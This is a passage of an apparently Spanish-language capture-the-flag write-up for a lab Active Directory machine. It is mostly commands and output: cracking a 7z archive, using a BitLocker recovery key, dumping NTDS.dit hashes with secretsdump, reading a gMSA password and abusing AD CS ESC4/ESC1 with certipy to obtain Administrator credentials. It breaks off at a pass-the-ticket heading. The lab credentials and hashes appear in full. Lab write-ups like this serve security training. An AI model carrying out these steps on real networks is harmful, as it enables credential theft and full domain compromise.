Aplicaremos un filtro para ver el protocolo HTTP, veremos la siguiente solicitud `POST`

~~~ http
POST /api/change_auth_token HTTP/1.1
Host: 192.168.1.106:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.106:5000/files
Authorization: b0439fae31f8cbba6294af86234d5a28
new_auth_token: M@rtinez_P@ssw0rd!
Origin: http://192.168.1.106:5000
Connection: keep-alive
Cookie: session=eyJhdXRob3JpemF0aW9uIjoic2VjdXJlcGFzc3dvcmQifQ.ZdkzzA.K3sT3Ai7Sa9zWQDts-DMTRfp39Y
Content-Length: 0
~~~

Veremos una contraseña que parece ser la de la cuenta `O.martinez`, podemos validarla con `netexec`

~~~ bash
nxc winrm dc01.infiltrator.htb -u o.martinez -p 'M@rtinez_P@ssw0rd!'
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd!

nxc rdp dc01.infiltrator.htb -u o.martinez -p 'M@rtinez_P@ssw0rd!' 
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd! (Pwn3d!)
~~~


## BitLocker Backup Analysis

Exportaremos los archivos transferidos en este tráfico HTTP para un análisis más detallado. Haremos clic en `File` > `Export Objects` > `HTTP`

![image-center](/assets/images/posts/infiltrator-wireshark-2.png)
{: .align-center}

Se nos abrirá este menú, y basta con exportar el archivo `BitLocker-backup.7z`

![image-center](/assets/images/posts/infiltrator-wireshark-3.png)
{: .align-center}

Se guarda el siguiente archivo, podemos ver que contiene un archivo HTML

~~~ bash
7z l BitLocker-backup.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 5 3550H with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 209327 bytes (205 KiB)

Listing archive: BitLocker-backup.7z

--
Path = BitLocker-backup.7z
Type = 7z
Physical Size = 209327
Headers Size = 271
Method = LZMA2:20 7zAES
Solid = -
Blocks = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-02-19 14:11:00 D....            0            0  BitLocker-backup
2024-02-20 08:51:45 ....A       792371       209056  BitLocker-backup/Microsoft account _ Clés de récupération BitLocker.html
------------------- ----- ------------ ------------  ------------------------
2024-02-20 08:51:45             792371       209056  1 files, 1 folders
~~~

Pero está protegido por contraseña, si intentamos usar alguna de las que ya tenemos, no funcionará

~~~ bash
Enter password (will not be echoed):
ERROR: Data Error in encrypted file. Wrong password? : BitLocker-backup/Microsoft account _ Clés de récupération BitLocker.html
                                                                             
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
~~~


## Cracking `7z` File Password

Al intentar extraer un hash del archivo `.7z`, obtendremos un pequeño error

~~~ bash
7z2john BitLocker-backup.7z

Can't locate Compress/Raw/Lzma.pm in @INC (you may need to install the Compress::Raw::Lzma module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.36.0 /usr/local/share/perl/5.36.0 /usr/lib/x86_64-linux-gnu/perl5/5.36 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.36 /usr/share/perl/5.36 /usr/local/lib/site_perl) at /usr/bin/7z2john line 6.
BEGIN failed--compilation aborted at /usr/bin/7z2john line 6.
~~~

Esto se soluciona instalando una dependencia de `perl` con el siguiente comando

~~~ bash
apt install libcompress-raw-lzma-perl
~~~

Ahora intentaremos nuevamente extraer el hash del archivo `.7z` para intentar hacer fuerza bruta

~~~ bash
7z2john BitLocker-backup.7z > hash.txt

ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
~~~

Procederemos a crackear el hash utilizando la siguiente sintaxis enviando el parámetro `--username`

~~~ bash
hashcat --username hash.txt /usr/share/wordlists/rockyou.txt -O

...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

11600 | 7-Zip | Archive

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

This hash-mode is known to emit multiple valid candidates for the same hash.
Use --keep-guessing to continue attack after finding the first crack.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 20

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.

Started: Mon Jun 16 17:40:59 2025
Stopped: Mon Jun 16 17:41:09 2025
~~~

Podemos evitar el output excesivo usando algunos filtros para ver solamente la contraseña, la cual es `zipper`

~~~ bash
hashcat --username hash.txt --show
...
...
12513ee8a205bbc3c04e7511415d4e9e655cd6d3fad96f70edec6109bbe90f7eb3cba96da74c284d5bbe014fd37c790ed28b8e5ffdc16a9385cd62d929b542553fd9a74fac26fddb8ec64fc2539a$792371$10:zipper
~~~

Ya con la contraseña del archivo comprimido, lo extraeremos para acceder a su contenido

~~~ bash
7z x BitLocker-backup.7z              

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 5 3550H with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 209327 bytes (205 KiB)

Extracting archive: BitLocker-backup.7z
--
Path = BitLocker-backup.7z
Type = 7z
Physical Size = 209327
Headers Size = 271
Method = LZMA2:20 7zAES
Solid = -
Blocks = 1

Enter password (will not be echoed):
Everything is Ok                                                             

Folders: 1
Files: 1
Size:       792371
Compressed: 209327
~~~

Nos dejará una carpeta con un archivo `.html`

~~~ bash
cd BitLocker-backup
ls

Microsoft account _ Clés de récupération BitLocker.html
~~~

### BitLocker Recovery Key

Podemos iniciar un servidor HTTP con `python3`, la web contiene todo lo necesario para verse de la siguiente manera

![image-center](/assets/images/posts/infiltrator-bitlocker-recovery-key.png)
{: .align-center}

Veremos la clave de recuperación de BitLocker en la columna `Clé de récupération`

~~~ bash
650540-413611-429792-307362-466070-397617-148445-087043
~~~


## Remote Desktop as `O.Martinez`

Nos conectaremos por RDP como el usuario `O.martinez` al DC, en mi casó utilicé `xfreerdp`

~~~ bash
xfreerdp /v:INFILTRATOR.HTB /u:O.martinez /p:'M@rtinez_P@ssw0rd!'
~~~

Al conectarnos veremos una unidad `E:` que está protegida por `BitLocker`

![image-center](/assets/images/posts/infiltrator-rdp-as-o-martinez.png)
{: .align-center}

Ingresaremos la clave de recuperación de `BitLocker` para desbloquear esta unidad de disco

![image-center](/assets/images/posts/infiltrator-rdp-as-o-martinez-2.png)
{: .align-center}

Al desbloquear la unidad, veremos una carpeta que parece ser una copia de seguridad

![image-center](/assets/images/posts/infiltrator-rdp-as-o-martinez-3.png)
{: .align-center}

Podemos abrir una consola desde la barra superior de la siguiente manera escribiendo `cmd` en la barrera superior

![image-center](/assets/images/posts/infiltrator-rdp-as-o-martinez-4.png)
{: .align-center}

Listaremos recursivamente los directorios en busca de archivos rápidamente con el comando `tree /f`

~~~ bash
E:\Windows Server 2012 R2 - Backups\Users> tree /f

Folder PATH listing for volume Backaup Disk
Volume serial number is 60C1-1A04
E:.
├───Administrator
│   ├───Contacts
│   ├───Desktop
│   ├───Documents
│   │       Backup_Credentials.7z
~~~

Existe un archivo `Backup_Credentials.7z` en la carpeta `C:\Users\Administrator\Documents`

~~~ bash
E:\Windows Server 2012 R2 - Backups\Users\Administrator\Documents> dir

 Volume in drive E is Backaup Disk
 Volume Serial Number is 60C1-1A04

 Directory of E:\Windows Server 2012 R2 - Backups\Users\Administrator\Documents

02/25/2024  07:48 AM    <DIR>          .
02/25/2024  07:48 AM    <DIR>          ..
02/25/2024  07:23 AM         2,055,137 Backup_Credentials.7z
               1 File(s)      2,055,137 bytes
               2 Dir(s)     983,375,872 bytes free
~~~

Tenemos permisos suficientes para copiar este archivo a una carpeta que nosotros controlemos, en mi caso, `C:\Temp`

~~~ bash
E:\Windows Server 2012 R2 - Backups\Users\Administrator\Documents> copy Backup_Credentials.7z C:\Temp

        1 file(s) copied.
~~~

Visualmente podemos ver el archivo junto a otros que son los que hemos estado utilizando

![image-center](/assets/images/posts/infiltrator-rdp-as-o-martinez-5.png)
{: .align-center}

Ahora desde una `powershell` descargamos el archivo en nuestra máquina

~~~ bash
*Evil-WinRM* PS C:\Temp> download Backup_Credentials.7z
~~~

Extraemos este archivo `.7z` en un directorio dedicado, solo por comodidad

~~~ bash
mkdir backup
cd backup
7z x Backup_Credentials.7z            

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 5 3550H with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 2055137 bytes (2007 KiB)

Extracting archive: Backup_Credentials.7z
--
Path = Backup_Credentials.7z
Type = 7z
Physical Size = 2055137
Headers Size = 250
Method = LZMA2:24
Solid = +
Blocks = 1

Everything is Ok        

Folders: 2
Files: 3
Size:       48513024
Compressed: 2055137
~~~

Vemos que contiene los siguientes archivos:

- `NTDS`: Base de datos principal de Active Directory, contiene toda la información del dominio
- `SECURITY`: Contiene la clave de cifrado utilizada para mantener protegido el archivo `NTDS`
- `SYSTEM`: Base de datos de configuraciones del sistema, aplicaciones y usuarios locales

~~~ bash
tree .                                       
.
├── Active Directory
│   └── ntds.dit
└── registry
    ├── SECURITY
    └── SYSTEM
~~~


## Dumping Active Directory Password Hashes

Tenemos los archivos necesarios para extraer todos los hashes del dominio

~~~ bash
secretsdump.py local -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY > out.txt

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd7e7d8797c1ccd58d95e4fb25cb7bdd4
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:4b90048ad6028aae98f66484009266d4efa571d48a8aa6b771d69d20aba16ddb7e0a0ffe9378a1ac7b31a812f0760fe2a8ce66ff6a0ff772155a29baa59b4407a95a920d0904cba6f8b19b6393f1551a476f991bbedaa66880e60611482a81b31b34c55c77d0e0d1792e3b18cdc9d39e0b776e7ef082399b096aaa2e8d93eb1f0340fd5f6e138da2580d1f581ff9426dce99a901a1bf88ad3f19a5bc4ce8ff17fdbb0a04bb29f13dc46177a6d8cd61bf91f8342e33b5362daecbb888df22ce467aa9f45a9dc69b03d116eeac89857d17f3f44f4abc34165b296a42b3b3ff5ab26401b5734fab6ad142d7882715927e45
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x81f5247051ff9535ad8299f0efd531ff3a5cb688
dpapi_userkey:0x79d13d91a01f6c38437c526396febaf8c1bc6909
[*] NL$KM 
 0000   2E 8A EC D8 ED 12 C6 ED  26 8E B0 9B DF DA 42 B7   ........&.....B.
 0010   49 DA B0 07 05 EE EA 07  05 02 04 0E AD F7 13 C2   I...............
 0020   6C 6D 8E 19 1A B0 51 41  7C 7D 73 9E 99 BA CD B1   lm....QA|}s.....
 0030   B7 7A 3E 0F 59 50 1C AD  8F 14 62 84 3F AC A9 92   .z>.YP....b.?...
NL$KM:2e8aecd8ed12c6ed268eb09bdfda42b749dab00705eeea070502040eadf713c26c6d8e191ab051417c7d739e99bacdb1b77a3e0f59501cad8f1462843faca992
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d27644ab3070f72ec264fcb413d75299
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7bf62b9c45112ffdadb7b6b4b9299dd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:454fcbc37690c6e4628ab649e8e285a5:::
infiltrator.htb\winrm_svc:1104:aad3b435b51404eeaad3b435b51404ee:84287cd16341b91eb93a58456b73e30f:::
infiltrator.htb\lan_managment:1105:aad3b435b51404eeaad3b435b51404ee:e8ade553d9b0cb1769f429d897c92931:::
infiltrator.htb\M.harris:1106:aad3b435b51404eeaad3b435b51404ee:fc236589c448c620417b15597a3d3ca7:::
infiltrator.htb\D.anderson:1107:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\L.clark:1108:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\O.martinez:1109:aad3b435b51404eeaad3b435b51404ee:eb86d7bcb30c8eac1bdcae5061e2dff4:::
infiltrator.htb\A.walker:1110:aad3b435b51404eeaad3b435b51404ee:46389d8dfdfcf0cbe262a71f576e574b:::
infiltrator.htb\K.turner:1111:aad3b435b51404eeaad3b435b51404ee:48bcd1cdc870c6285376a990c2604531:::
infiltrator.htb\E.rodriguez:1112:aad3b435b51404eeaad3b435b51404ee:b1918c2ce6a62f4eee11c51b6e2e965a:::
[*] Kerberos keys from Active Directory/ntds.dit 
DC$:aes256-cts-hmac-sha1-96:09b3e08f549e92e0b16ed45f84b25cc6d0c147ff169ce059811a3ed9e6957176
DC$:aes128-cts-hmac-sha1-96:d2a3d7c9ee6965b1e3cd710ed1ceed0f
DC$:des-cbc-md5:5eea34b3317aea91
krbtgt:aes256-cts-hmac-sha1-96:f6e0a1bd3a180f83472cd2666b28de969442b7745545afb84bbeaa9397cb9b87
krbtgt:aes128-cts-hmac-sha1-96:7874dff8138091d6c344381c9c758540
krbtgt:des-cbc-md5:10bfc49ecd3b58d9
infiltrator.htb\winrm_svc:aes256-cts-hmac-sha1-96:ae473ae7da59719ebeec93c93704636abb7ee7ff69678fdec129afe2fc1592c4
infiltrator.htb\winrm_svc:aes128-cts-hmac-sha1-96:0faf5e0205d6f43ae37020f79f60606a
infiltrator.htb\winrm_svc:des-cbc-md5:7aba231386c2ecf8
infiltrator.htb\lan_managment:aes256-cts-hmac-sha1-96:6fcd2f66179b6b852bb3cc30f2ba353327924081c47d09bc5a9fafc623016e96
infiltrator.htb\lan_managment:aes128-cts-hmac-sha1-96:48f45b8eb2cbd8dbf578241ee369ddd9
infiltrator.htb\lan_managment:des-cbc-md5:31c83197ab944052
infiltrator.htb\M.harris:aes256-cts-hmac-sha1-96:20433af8bf6734568f112129c951ad87f750dddf092648c80816d5cb42ed0f49
infiltrator.htb\M.harris:aes128-cts-hmac-sha1-96:2ee0cd05c3fa205a92e6837ff212b7a0
infiltrator.htb\M.harris:des-cbc-md5:3ee3688376f2e5ce
infiltrator.htb\D.anderson:aes256-cts-hmac-sha1-96:42447533e9f1c9871ddd2137def662980e677a748b5d184da910d3c4daeb403f
infiltrator.htb\D.anderson:aes128-cts-hmac-sha1-96:021e189e743a78a991616821138e2e69
infiltrator.htb\D.anderson:des-cbc-md5:1529a829132a2345
infiltrator.htb\L.clark:aes256-cts-hmac-sha1-96:dddc0366b026b09ebf0ac3e7a7f190b491c4ee0d7976a4c3b324445485bf1bfc
infiltrator.htb\L.clark:aes128-cts-hmac-sha1-96:5041c75e19de802e0f7614f57edc8983
infiltrator.htb\L.clark:des-cbc-md5:cd023d5d70e6aefd
infiltrator.htb\O.martinez:aes256-cts-hmac-sha1-96:4d2d8951c7d6eba4edaf172fd0f7b78ab7260e3d513bf2ff387c70c85d912a2f
infiltrator.htb\O.martinez:aes128-cts-hmac-sha1-96:33fdf738e13878a8101e3bf929a5a120
infiltrator.htb\O.martinez:des-cbc-md5:f80bc202755d2cfd
infiltrator.htb\A.walker:aes256-cts-hmac-sha1-96:e26c97600c6f44990f18480087a685e0f1c71bcfbc8413dce6764ccf77df448a
infiltrator.htb\A.walker:aes128-cts-hmac-sha1-96:768672b783131ed963b9deeac0a6d2e4
infiltrator.htb\A.walker:des-cbc-md5:a7e6cde06d6e153b
infiltrator.htb\K.turner:aes256-cts-hmac-sha1-96:2c816a32b395f67df520bc734f7ea8e4df64a9610ffb3ef43e0e9df69b9df8b8
infiltrator.htb\K.turner:aes128-cts-hmac-sha1-96:b20f41c0d3b8fb6e1b793af4a835109b
infiltrator.htb\K.turner:des-cbc-md5:4607b9eaec6838ba
infiltrator.htb\E.rodriguez:aes256-cts-hmac-sha1-96:9114030dd2a57970530eda4ce0aa6b14f88f2be44f6d920de31eb6ee6f1587b5
infiltrator.htb\E.rodriguez:aes128-cts-hmac-sha1-96:ddd37cf706781414885f561c3b469d0c
infiltrator.htb\E.rodriguez:des-cbc-md5:9d5bdaf2cd26165d
[*] Cleaning up... 
~~~


## (Failed) PassTheHash

Si intentamos hacer `PassTheHash` utilizando el hash NT del usuario `Administrator`, no será válido

~~~ bash
nxc smb dc01.infiltrator.htb -u Administrator -H '7bf62b9c45112ffdadb7b6b4b9299dd2'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\Administrator:7bf62b9c45112ffdadb7b6b4b9299dd2 STATUS_LOGON_FAILURE
~~~

Podemos guardar los hashes de la siguiente manera para verificar si algún usuario puede autenticarse con su hash NTLM

~~~ bash
cat out.txt | grep 'infiltrator' | cut -d: -f4 | sort -u > hashes.txt
~~~

De igual forma guardaremos un listado de usuarios, eliminaremos los registros duplicados

~~~ bash
cat out.txt | grep 'infiltrator' | cut -d: -f1 | sort -u > users.txt
~~~

Intentaremos autenticarnos con el listado de usuarios y los hashes NTLM para verificar si logramos autenticar a algún usuario del que no tengamos control. Sin embargo, solo el hash NT para el usuario `L.clark` funcionará, y ya habíamos obtenido control de esta cuenta al principio

~~~ bash
nxc smb dc01.infiltrator.htb -u users.txt -H hashes.txt --continue-on-success
...
... 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\lan_managment:627a2cb0adc7ba12ea11174941b3da88 STATUS_LOGON_FAILURE 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\M.harris:627a2cb0adc7ba12ea11174941b3da88 STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\D.anderson:627a2cb0adc7ba12ea11174941b3da88 STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\L.clark:627a2cb0adc7ba12ea11174941b3da88
~~~


## NTDS Analysis

Usaremos una herramienta de análisis forense que nos permita extraer la información contenida dentro del archivo `ntds.dit`, en este caso usaremos [ntdissector](https://github.com/synacktiv/ntdissector).

Prepararemos un entorno virtual que contenga las dependencias necesarias

~~~ bash
python3 -m venv venv    
source venv/bin/activate
pip install -r requirements.txt
~~~

Continuaremos con el análisis de la base de datos `NTDS.dit`, en este caso extraeremos todos los registros incluidos los que fueron borrados

~~~ bash
ntdissector -ntds ntds.dit -system SYSTEM -outputdir . -ts -f user -keepDel           
[2025-06-16 23:39:39] [*] PEK # 0 found and decrypted: d27644ab3070f72ec264fcb413d75299
[2025-06-16 23:39:39] [*] Filtering records with this list of object classes :  ['user']
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3823/3823 [00:01<00:00, 3626.89rec./s]
[2025-06-16 23:39:40] [*] Finished, matched 12 records out of 3823
[2025-06-16 23:39:40] [*] Processing 12 serialization tasks
100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 12/12 [00:00<00:00, 144.44rec./s]
~~~

Se ha completado la extracción, podremos ver los resultados dentro del directorio `out`. Veremos algo inusual para la cuenta `lan_managment`

~~~ bash
cat out/118a48dc41fce5ffea884c0793d4ac92/user.json | jq

{
  "description": "l@n_M@an!1331",
  "userPrincipalName": "lan_managment@infiltrator.htb",
  "dSCorePropagationData": "1601-01-01T00:00:00+00:00",
  "userAccountControl": "NORMAL_ACCOUNT",
  "mail": "lan_managment@infiltrator.htb",
  "objectSid": "S-1-5-21-822140885-2101723098-820748671-1105",
  "title": "Services Managment",
...
...
  },
  "badPasswordTime": "1601-01-01T00:00:00+00:00",
  "distinguishedName": "CN=lan_managment,CN=Users,DC=infiltrator,DC=htb",
  "sAMAccountName": "lan_managment",
  "sAMAccountType": "SAM_GROUP_OBJECT | SAM_NON_SECURITY_GROUP_OBJECT | SAM_ALIAS_OBJECT | SAM_NON_SECURITY_ALIAS_OBJECT | SAM_USER_OBJECT | SAM_NORMAL_USER_ACCOUNT | SAM_MACHINE_ACCOUNT | SAM_TRUST_ACCOUNT | SAM_ACCOUNT_TYPE_MAX",
  "objectClass": [
    "user",
    "organizationalPerson",
    "person",
    "top"
  ]
~~~

Parece ser su contraseña, la validaremos con `netexec`

~~~ bash
nxc smb dc01.infiltrator.htb -u lan_managment -p 'l@n_M@an!1331'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331
~~~


## Abusing ACL - `ReadGMSAPassword` Rights

La cuenta `infiltrator_svc$` es una cuenta `gMSA` (Group Managed Service Account), este tipo de cuentas es gestionada por el DC, quien cambia y maneja sus credenciales de forma automática. 

En este contexto, la cuenta `lan_managment` puede ver su contraseña gracias al derecho `ReadGMSAPassword`

![image-center](/assets/images/posts/infiltrator-bloodhound-4.png)
{: .align-center}

Podremos obtener la contraseña de diferentes maneras, en mi caso he optado por usar `netexec`, que parece ser la forma más rápida para obtener el hash NT de la cuenta víctima

~~~ bash
nxc ldap dc01.infiltrator.htb -u lan_managment -p 'l@n_M@an!1331' --gmsa
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.31     636    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331 
LDAPS       10.10.11.31     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.31     636    DC01             Account: infiltrator_svc$     NTLM: 653b2726881d6e5e9ae3690950f9bcc4
~~~


## Abusing AD CS - `ESC4` Technique

Enumeraremos el servicio de certificados de Active Directory (AD CS) con las credenciales de esta cuenta, buscaremos plantillas vulnerables que podamos aprovechar para escalar privilegios 

~~~ bash
certipy find -u 'infiltrator_svc$' -hashes '653b2726881d6e5e9ae3690950f9bcc4' -dc-ip 10.10.11.31 -vulnerable                        
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'infiltrator-DC01-CA'
[*] Saved BloodHound data to '20250616235927_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250616235927_Certipy.txt'
[*] Saved JSON output to '20250616235927_Certipy.json'
~~~

En este caso encontramos una plantilla con el nombre `Infiltrator_Template` que parece ser vulnerable a `ESC4` debido a que el usuario que controlamos posee permisos excesivos sobre la plantilla

~~~ bash
cat 20250616235927_Certipy.txt
...
...
...
Certificate Templates
  0
    Template Name                       : Infiltrator_Template
    Display Name                        : Infiltrator_Template
    Certificate Authorities             : infiltrator-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Smart Card Logon
                                          Server Authentication
                                          KDC Authentication
                                          Client Authentication
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Validity Period                     : 99 years
    Renewal Period                      : 650430 hours
    Minimum RSA Key Length              : 2048
    Permissions
      Object Control Permissions
        Owner                           : INFILTRATOR.HTB\Local System
        Full Control Principals         : INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Owner Principals          : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Dacl Principals           : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Property Principals       : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
    [!] Vulnerabilities
      ESC4                              : 'INFILTRATOR.HTB\\infiltrator_svc' has dangerous permissions
~~~

Esta técnica nos permite modificar atributos de la plantilla a través de los permisos `WriteProperty`, cambiando su configuración para hacerla vulnerable a `ESC1`.

~~~ bash
certipy template -u 'infiltrator_svc$' -hashes '653b2726881d6e5e9ae3690950f9bcc4' -dc-ip 10.10.11.31 -template Infiltrator_Template -debug   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Authenticating to LDAP server
[+] Bound to ldaps://10.10.11.31:636 - ssl
[+] Default path: DC=infiltrator,DC=htb
[+] Configuration path: CN=Configuration,DC=infiltrator,DC=htb
[*] Updating certificate template 'Infiltrator_Template'
[+] MODIFY_DELETE:
[+]     pKIExtendedKeyUsage: []
[+]     msPKI-Certificate-Application-Policy: []
[+] MODIFY_REPLACE:
[+]     nTSecurityDescriptor: [b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00']
[+]     flags: [b'0']
[+]     pKIDefaultKeySpec: [b'2']
[+]     pKIKeyUsage: [b'\x86\x00']
[+]     pKIMaxIssuingDepth: [b'-1']
[+]     pKICriticalExtensions: [b'2.5.29.19', b'2.5.29.15']
[+]     pKIExpirationPeriod: [b'\x00@\x1e\xa4\xe8e\xfa\xff']
[+]     pKIOverlapPeriod: [b'\x00\x80\xa6\n\xff\xde\xff\xff']
[+]     pKIDefaultCSPs: [b'1,Microsoft Enhanced Cryptographic Provider v1.0']
[+]     msPKI-RA-Signature: [b'0']
[+]     msPKI-Enrollment-Flag: [b'0']
[*] Successfully updated 'Infiltrator_Template'
~~~

En el ejemplo anterior forzamos que la plantilla sea vulnerable a `ESC1` modificando los permisos en el atributo `nTSecurityDescriptor` (obtenemos control total), además de eliminar restricciones en `pKIExtendedKeyUsage`. Esto nos permitirá especificar un `subjectAltName` (SAN) para solicitar un certificado en nombre de otro usuario.

Emitiremos un certificado privilegiado enrolando al usuario `Administrator`

~~~ bash
certipy req -u 'infiltrator_svc$' -hashes '653b2726881d6e5e9ae3690950f9bcc4' -dc-ip 10.10.11.31 -target dc01.infiltrator.htb -ca infiltrator-DC01-CA -template Infiltrator_Template -upn Administrator -debug 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.infiltrator.htb' at '10.10.11.31'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.31[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.31[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
~~~

Usaremos el certificado a modo de autenticación PKINIT (`kerberos` + Certificados) para obtener su hash NT además de credenciales almacenadas en caché

~~~ bash
certipy auth -pfx administrator.pfx -username Administrator -domain infiltrator.htb -debug                       Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'infiltrator.htb' at '192.168.29.2'
[*] Using principal: administrator@infiltrator.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1
~~~


## PassTheTicket

